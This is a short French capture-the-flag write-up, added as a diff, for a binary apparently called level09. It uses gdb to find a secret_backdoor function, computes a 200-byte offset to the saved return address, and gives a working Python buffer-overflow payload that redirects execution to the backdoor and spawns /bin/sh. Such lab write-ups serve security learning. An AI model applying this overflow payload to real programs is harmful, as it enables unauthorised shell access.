@@ -1,0 +1,29 @@
+En utilisant gdb on remarque une fonction secret_backdoor avec un appel à system et un buffer.
+On va donc exploiter un buffer overflow pour réecrire l'adresse de retour d'une fonction afin d'appeler secret_backdoor.
+
+On remarque auss que le programme copie 41 char dans un buffer de 40; il utilise aussi le nombre qui suit comme dernier paramètre du strncpy copiant ce buffer.
+Il est donc possible d'effectueur une buffer overflow afin de remplacer l'EIP par l'adresse de la fonction secret_backdoor.
+Ce qui nous permettra de lancer ce qu'il y a dans l'entrée d'user.
+
+On a donc déjà la première partie de l'exploit.
+
+On recherche maintenant l'adresse de la fonction secret_backdoor
+
+(gdb) info function secret_backdoor
+All functions matching regular expression "secret_backdoor":
+
+Non-debugging symbols:
+0x000055555555488c  secret_backdoor
+
+
+On doit donc trouver maintenant l'offset à partir duquel on peut écrire l'adresse de notre fonction.
+
+On trouve l'adresse de l'EIP = 0x7fffffffe5c8
+On trouve l'adresse du msg = 0x7fffffffe500
+
+offset = 0x7fffffffe5c8 - 0x7fffffffe500 = 200
+
+On obtient donc l'exploit suivant:
+
+python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/level09
+cat /tmp/level09 - | ./level09
